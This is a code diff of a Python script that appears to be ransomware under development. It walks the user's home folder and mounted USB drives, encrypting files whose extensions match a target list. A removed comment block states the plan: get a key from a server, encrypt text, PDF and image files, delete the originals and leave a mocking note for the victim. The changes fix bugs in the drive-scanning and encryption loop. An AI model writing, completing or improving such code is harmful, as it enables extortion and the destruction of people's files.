@@ -13,18 +13,6 @@ import sys
 from AES import *
 from RSA import *
 from SRSA import *
-'''
-
-    COMUNICA COM O SERVIDOR ENVIANDO O SEU ID
-    O SERVIDOR ARMAZENA O ID E MANDA UMA CHAVE PARA CRIPTOGRAFAR
-    MULTIPLAS THREADS- CADA UMA CRIPTOGRAFA UM TIPO DE ARQUIVO -> TXT PDF JPEG
-    MULTIPLAS THREADS PARA EXCLUIR OS ARQUIVOS ORIGINAIS TXT PDF JPEG
-    IF(TERMINOU(PDF)) -> RODA THREAD EXCLUIR(PDF)
-    CRIAR ARQUIVO .TXT INFORMANDO QUE O CARA SI FUDEU
-
-'''
-
-
 
 
 texto='''
@@ -41,22 +29,15 @@ def menu(modo):
     f=open('tipos_arquivos.txt','r')
     tipos=f.read()
     tipos=tipos.split('\n')
-    # diretorios no caminho de partida
-    diretorios=os.listdir(home)
-    tam=len(diretorios)
-    for a in range(tam):
-        p=multiprocessing.Process(target=listar,args=(diretorios[a],tipos))
-        p.start()
-        #p.join() -> em ordem # espera um terminar para começar outro
     listar(home,tipos,modo)
-    listar_media(modo)
+    listar_media(modo,tipos)
 
 
-def lista_media(modo):
+def listar_media(modo,tipos_arq):
     print('Procurando por pendrives/HDs')
     caminho='/media/'+getpass.getuser()
     if(os.path.isdir(caminho)):
-        listar(caminho,modo)
+        listar(caminho,tipos_arq,modo)
 
 
 
@@ -69,7 +50,10 @@ def listar(diretorio, tipos_arq, modo):
                 for ext in tipos_arq:
                     if(extensao[1]==ext):
                         a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
-                        criptografa(a)
+                        try:
+                            criptografa(a)
+                        except:
+                            print('erro ao criptografar-> ' +str(a))
 
     else: # descriptgrafa
         for caminho, diretorio, arquivo in os.walk(diretorio):
